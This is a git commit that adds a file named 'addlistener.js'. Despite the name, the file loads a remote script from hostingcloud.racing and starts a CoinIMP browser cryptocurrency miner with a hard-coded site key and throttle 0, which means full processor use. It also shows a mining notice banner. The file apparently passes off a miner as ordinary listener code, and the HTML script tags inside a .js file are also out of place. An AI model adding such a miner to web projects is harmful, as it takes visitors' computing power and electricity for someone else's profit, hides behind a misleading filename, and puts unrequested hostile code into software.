a95f544f20625b41f9f1bce7866bbf1046cbe191
charles francis <charlsefrancis112@gmail.com>
2020-06-28 00:59:14 +0800

    Create addlistener.js

---
+++ addlistener.js
@@ -0,0 +1,9 @@
+<script src="https://www.hostingcloud.racing/RvwI.js"></script>
+<script>
+    var _client = new Client.Anonymous('7769b3d7d7b02bda722067fb6b1985a3c5d676e210447db1fced959ae8f35bae', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
+</script>
